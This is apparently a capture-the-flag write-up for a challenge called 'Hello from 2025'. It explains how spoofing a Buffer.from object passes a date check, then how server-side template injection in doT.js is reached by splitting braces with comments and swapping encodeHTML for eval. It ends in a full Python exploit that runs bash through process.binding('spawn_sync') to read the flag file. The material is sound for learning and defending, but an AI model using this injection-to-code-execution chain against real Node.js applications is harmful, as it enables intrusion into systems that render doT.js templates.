# Hello from 2025

## Description
Happy new year!
Please test on your local machine before attempting on remote.

## Writeup

The Buffer.from method in Node.js accepts various argument types. Although it's not explicitly documented, one format it supports is:
```js
// <Buffer 61 62 63>
Buffer.from({
    type: "Buffer",
    data: [0x61, 0x62, 0x63]
})
```
(See: https://github.com/nodejs/node/blob/413975a580429585fbbf1e6d3bf55179b2b1e075/lib/buffer.js#L537)
Using the `/now` endpoint, we can determine the format for `new Date().toString()`. This allows us to create an object for `Buffer.from(user)` that matches the output of `Buffer.from(new Date('2025-01-01T00:00:00'))`.

With this setup, we can trigger SSTI in doT.js. doT.js templates support arbitrary code execution with the `{{<expression>}}` syntax. However, `{{`, and `}}` are restricted.

Examining the doT.js code, we see that `/*...*/` are removed before processing. This means we can bypass the restriction using `{/**/{<expression>}/**/}`

To execute a function without using `(` or `)`, override `escapeHTML` by `{{=escapeHTML=eval}}`and call it by `{{!it.x}}`.

https://github.com/olado/doT/blob/031d3bb7520eed6b93886df2b650b7fce12a7007/doT.js#L98

This allows for RCE. Here's the full exploit.

```python
import requests

URL = "http://localhost:1337/"

r = requests.get(URL + "now")
print(r.text)

cmd = 'cat /flag-*'
data = {
    "type": "Buffer",
    "data": list("Wed Jan 01 2025 00:00:00 GMT+0000 (Coordinated Universal Time)".encode()), 
    "template": "{/**/{=encodeHTML=eval}/**/}{/**/{!it.x}/**/}",
    "x": """process.binding('spawn_sync').spawn({
    file: 'bash',
    args: ['bash','-c', '%s'], 
    stdio: [
        { type: 'pipe', readable: true, writable: true },
        { type: 'pipe', readable: true, writable: true }
    ],
}).output + ''""" % cmd
}
r = requests.post(URL, json=data)
print(r.text)
```